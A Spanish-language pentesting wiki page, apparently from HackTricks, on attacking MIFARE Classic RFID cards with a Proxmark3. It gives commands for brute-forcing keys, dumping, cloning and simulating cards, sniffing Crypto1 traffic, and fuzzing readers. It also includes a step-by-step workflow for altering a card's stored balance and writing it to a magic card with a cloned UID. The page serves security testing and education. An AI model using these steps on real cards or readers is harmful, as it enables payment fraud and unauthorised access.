# Proxmark 3

{{#include ../../banners/hacktricks-training.md}}

## Atacar sistemas RFID con Proxmark3

Instala el cliente Proxmark3 RRG/Iceman, que se mantiene activamente, y el firmware correspondiente. Después, confirma la sintaxis de los comandos con esa versión, ya que los comandos antiguos que se muestran a continuación podrían haber cambiado.<sup>[[1]](#references)[[5]](#references)</sup>

### Atacar MIFARE Classic 1KB

MIFARE Classic 1K tiene **16 sectores**, cada uno con **4 bloques** de **16 bytes**. El bloque 0 del fabricante contiene el UID y los datos del fabricante, y es de solo lectura en las tarjetas NXP originales; las tarjetas clon especiales o “magic” pueden permitir reescribirlo.<sup>[[1]](#references)[[2]](#references)</sup>\
Para acceder a cada sector necesitas **2 claves** (**A** y **B**), almacenadas en el **bloque 3 de cada sector** (trailer del sector). El trailer del sector también almacena los **bits de acceso**, que definen los permisos de **lectura y escritura** de **cada bloque** usando las 2 claves.\
Por ejemplo, las 2 claves son útiles para conceder permisos de lectura si conoces la primera y de escritura si conoces la segunda.

Se pueden realizar varios ataques

```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```

The Proxmark3 permite realizar otras acciones, como **interceptar** una **comunicación de Tag a Reader** para intentar encontrar datos sensibles. En esta tarjeta, bastaría con capturar la comunicación y calcular la clave utilizada, ya que las **operaciones criptográficas empleadas son débiles** y, conociendo el texto plano y el texto cifrado, es posible calcularla (herramienta `mfkey64`).<sup>[[3]](#references)</sup>

#### Flujo de trabajo rápido de MiFare Classic para abusar del valor almacenado

Cuando los terminales almacenan saldos en tarjetas Classic, un flujo típico de principio a fin es:<sup>[[4]](#references)</sup>

```bash
# 1) Recover sector keys and dump full card
proxmark3> hf mf autopwn

# 2) Modify dump offline (adjust balance + integrity bytes)
#    Use diffing of before/after top-up dumps to locate fields

# 3) Write modified dump to a UID-changeable ("Chinese magic") tag
proxmark3> hf mf cload -f modified.bin

# 4) Clone original UID so readers recognize the card
proxmark3> hf mf csetuid -u <original_uid>
```

Notas

- `hf mf autopwn` orquesta ataques de tipo nested/darkside/HardNested, recupera claves y crea dumps en la carpeta de dumps del cliente.<sup>[[1]](#references)</sup>
- Escribir el bloque 0/UID solo funciona en tarjetas magic gen1a/gen2. Las tarjetas Classic normales tienen un UID de solo lectura.<sup>[[2]](#references)</sup>
- Muchas implementaciones usan «value blocks» de Classic o sumas de comprobación simples. Asegúrate de que todos los campos duplicados/complementados y las sumas de comprobación sean coherentes después de editarlos.<sup>[[4]](#references)</sup>

Consulta una metodología de nivel superior y medidas de mitigación en:

{{#ref}}
pentesting-rfid.md
{{#endref}}

### Comandos sin procesar

En ocasiones, los sistemas IoT usan **tags sin marca o no comerciales**. En este caso, puedes usar Proxmark3 para enviar **comandos sin procesar a los tags**.

```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
  proprietary non iso14443-4 card found, RATS not supported
  No chinese magic backdoor command detected
  Prng detection: WEAK
  Valid ISO14443A Tag Found - Quitting Search
```

Con esta información, podrías intentar buscar información sobre la tarjeta y sobre cómo comunicarte con ella. Proxmark3 permite enviar comandos raw como: `hf 14a raw -p -b 7 26`

### Scripts

El software Proxmark3 incluye una lista precargada de **scripts de automatización** que puedes usar para realizar tareas sencillas. Para obtener la lista completa, usa el comando `script list`. Luego, usa el comando `script run`, seguido del nombre del script:

```
proxmark3> script run mfkeys
```

Puedes crear un script para **hacer fuzzing de lectores de tags**: basta con copiar los datos de una **tarjeta válida**, escribir un **script Lua** que **aleatorice** uno o más **bytes** al azar y comprobar si el **lector falla** en alguna iteración.

## References

- [1] [Wiki de Proxmark3: HF MIFARE](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Mifare)
- [2] [Wiki de Proxmark3: tarjetas HF Magic](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Magic-cards)
- [3] [Declaración de NXP sobre MIFARE Classic Crypto1](https://www.mifare.net/en/products/chip-card-ics/mifare-classic/security-statement-on-crypto1-implementations/)
- [4] [Explotación de vulnerabilidad en tarjetas NFC de KioSoft Stored Value (SEC Consult)](https://sec-consult.com/vulnerability-lab/advisory/nfc-card-vulnerability-exploitation-leading-to-free-top-up-kiosoft-payment-solution/)
- [5] [RRG/Iceman Proxmark3: instalación en Linux](https://github.com/RfidResearchGroup/proxmark3/blob/master/doc/md/Installation_Instructions/Linux-Installation-Instructions.md)
{{#include ../../banners/hacktricks-training.md}}
